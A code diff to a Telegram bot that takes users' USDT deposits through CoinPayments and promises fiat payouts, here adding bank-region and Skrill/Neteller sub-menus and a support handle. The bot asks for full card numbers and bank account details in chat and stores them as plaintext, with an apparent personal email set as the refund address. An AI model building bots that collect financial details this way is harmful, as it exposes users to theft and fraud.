@@ -32,6 +32,7 @@ const MERCHANT_ID = '431eb6f352649dfdcde42b2ba8d5b6d8'; // Your Merchant ID
 const BUYER_REFUND_EMAIL = 'azelchillexa@gmail.com'; // Your refund email
 const MIN_USDT = 25;
 const MAX_USDT = 50000;
+const SUPPORT_CONTACT = '@DeanAbdullah'; // REPLACE WITH YOUR SUPPORT USERNAME
 
 // Conversion Rates
 const RATES = {
@@ -114,7 +115,7 @@ This bot helps you convert your USDT into USD, EUR, or GBP. Here is the step-by-
 - Once your transaction is confirmed on the blockchain, we will process your fiat payout.
 
 *Need more help?*
-Contact our support at ${BUYER_REFUND_EMAIL}.
+Please write a direct message to our support team: ${SUPPORT_CONTACT}.
     `;
     bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
 });
@@ -132,15 +133,9 @@ bot.on('callback_query', (callbackQuery) => {
     }
 
     if (data === 'show_help') {
-        // Trigger the /help command's logic
-        bot.getMe().then(me => {
-             bot.processUpdate({
-                message: {
-                    ...msg,
-                    text: '/help',
-                    entities: [{type: 'bot_command', offset: 0, length: 5}]
-                }
-            });
+        // Use the existing /help command handler
+        bot.getMe().then(() => {
+             bot.processUpdate({ update_id: 0, message: { ...msg, text: '/help', entities: [{type: 'bot_command', offset: 0, length: 5}]}});
         });
     } else if (data === 'start_sell') {
         const ratesInfo = `*Current Exchange Rates:*\n- 1 USDT ≈ ${RATES.USDT_TO_USD.toFixed(3)} USD\n- 1 USDT ≈ ${(RATES.USDT_TO_USD * RATES.USD_TO_EUR).toFixed(3)} EUR\n- 1 USDT ≈ ${RATES.USDT_TO_GBP.toFixed(3)} GBP\n\nWhich currency would you like to receive?`;
@@ -174,9 +169,13 @@ bot.on('callback_query', (callbackQuery) => {
         bot.sendMessage(chatId, `Please enter the amount of USDT you want to sell.\n\n*Minimum:* ${MIN_USDT} USDT\n*Maximum:* ${MAX_USDT} USDT`, { parse_mode: 'Markdown' });
     } else if (data.startsWith('pay_')) {
         const method = data.split('_')[1];
-        userStates[chatId].paymentMethod = method;
-
         let prompt = '';
+        
+        // Don't set payment method yet for multi-step choices
+        if (method !== 'bank' && method !== 'skrill') {
+            userStates[chatId].paymentMethod = method;
+        }
+
         switch (method) {
             case 'wise':
                 prompt = 'Please provide your *Wise email* or *@wisetag*.';
@@ -191,12 +190,24 @@ bot.on('callback_query', (callbackQuery) => {
                 userStates[chatId].awaiting = 'paypal_details';
                 break;
             case 'bank':
-                prompt = 'Please provide your bank details in the following format:\n\n`Firstname Lastname, IBAN, Swift Code`';
-                userStates[chatId].awaiting = 'bank_details';
+                bot.sendMessage(chatId, "Please select your bank's region:", {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "🇪🇺 European Bank", callback_data: 'bank_eu' }],
+                            [{ text: "🇺🇸 US Bank", callback_data: 'bank_us' }]
+                        ]
+                    }
+                });
                 break;
             case 'skrill':
-                prompt = 'Please provide your *Skrill/Neteller email*.';
-                userStates[chatId].awaiting = 'skrill_details';
+                bot.sendMessage(chatId, "Are you using Skrill or Neteller?", {
+                   reply_markup: {
+                       inline_keyboard: [
+                           [{ text: "Skrill", callback_data: 'payout_skrill' }],
+                           [{ text: "Neteller", callback_data: 'payout_neteller' }]
+                       ]
+                   }
+               });
                 break;
             case 'card':
                 prompt = 'Please provide your *Visa or Mastercard number*.';
@@ -211,7 +222,27 @@ bot.on('callback_query', (callbackQuery) => {
                 userStates[chatId].awaiting = 'alipay_details';
                 break;
         }
-        bot.sendMessage(chatId, prompt, { parse_mode: 'Markdown' });
+        if (prompt) {
+            bot.sendMessage(chatId, prompt, { parse_mode: 'Markdown' });
+        }
+    } else if (data.startsWith('payout_')) { // Handles Skrill/Neteller choice
+        const method = data.split('_')[1]; // 'skrill' or 'neteller'
+        userStates[chatId].paymentMethod = method.charAt(0).toUpperCase() + method.slice(1);
+        userStates[chatId].awaiting = 'skrill_neteller_details';
+        bot.sendMessage(chatId, `Please provide your *${userStates[chatId].paymentMethod} email*.`, { parse_mode: 'Markdown' });
+    
+    } else if (data.startsWith('bank_')) { // Handles Bank region choice
+        const region = data.split('_')[1]; // 'eu' or 'us'
+        userStates[chatId].paymentMethod = region === 'eu' ? 'Bank Transfer (EU)' : 'Bank Transfer (US)';
+        if (region === 'eu') {
+            userStates[chatId].awaiting = 'bank_details_eu';
+            const prompt = 'Please provide your bank details. Reply with a single message in the following format:\n\n`First and Last Name:\nIBAN:\nSwift Code:`';
+            bot.sendMessage(chatId, prompt, { parse_mode: 'Markdown' });
+        } else if (region === 'us') {
+            userStates[chatId].awaiting = 'bank_details_us';
+            const prompt = 'Please provide your US bank details. Reply with a single message in the following format:\n\n`Account Holder Name:\nAccount Number:\nRouting Number (ACH or ABA):`';
+            bot.sendMessage(chatId, prompt, { parse_mode: 'Markdown' });
+        }
     }
 
     // Acknowledge the button press
@@ -224,7 +255,7 @@ bot.on('message', async (msg) => {
     const text = msg.text;
 
     // Ignore commands
-    if (text.startsWith('/')) return;
+    if (!text || text.startsWith('/')) return;
 
     // Check if we are waiting for a specific input from the user
     if (userStates[chatId] && userStates[chatId].awaiting) {
@@ -253,13 +284,17 @@ bot.on('message', async (msg) => {
                 }
             });
             userStates[chatId].awaiting = null; // Wait for button press now
-        } else if (awaiting.endsWith('_details')) {
+        } else if ([
+            'wise_details', 'revolut_details', 'paypal_details', 'card_details', 
+            'payeer_details', 'alipay_details', 'skrill_neteller_details', 
+            'bank_details_eu', 'bank_details_us'
+        ].includes(awaiting)) {
             userStates[chatId].paymentDetails = text;
+            userStates[chatId].awaiting = null; // Stop waiting for messages
             bot.sendMessage(chatId, "⏳ Thank you! Generating your secure deposit address, please wait...");
 
             // --- COINPAYMENTS API CALL ---
             try {
-                // Map network to CoinPayments currency code
                 const networkMap = {
                     'BEP20': 'USDT.BEP20',
                     'TRC20': 'USDT.TRC20',
@@ -268,13 +303,13 @@ bot.on('message', async (msg) => {
                 const coinCurrency = networkMap[userStates[chatId].network];
 
                 const transactionOptions = {
-                    currency1: 'USDT', // The currency the user is sending
-                    currency2: coinCurrency, // The currency we want to receive on the network
+                    currency1: 'USDT',
+                    currency2: coinCurrency,
                     amount: userStates[chatId].amount,
                     buyer_email: BUYER_REFUND_EMAIL,
                     custom: `Payout to ${userStates[chatId].paymentMethod}: ${userStates[chatId].paymentDetails}`,
                     item_name: `Sell ${userStates[chatId].amount} USDT for ${userStates[chatId].fiat}`,
-                    ipn_url: 'YOUR_IPN_WEBHOOK_URL' // Optional: for server-to-server notifications
+                    ipn_url: 'YOUR_IPN_WEBHOOK_URL'
                 };
 
                 const result = await coinpayments.createTransaction(transactionOptions);
@@ -285,8 +320,6 @@ bot.on('message', async (msg) => {
                     `⚠️ *IMPORTANT:* Send only USDT on the ${userStates[chatId].network} network to this address. Sending any other coin or using a different network may result in the loss of your funds.`;
 
                 bot.sendMessage(chatId, depositInfo, { parse_mode: 'Markdown' });
-
-                // Reset state after successful transaction
                 delete userStates[chatId];
 
             } catch (error) {
@@ -299,3 +332,4 @@ bot.on('message', async (msg) => {
 
 
 console.log("Bot is running...");
+
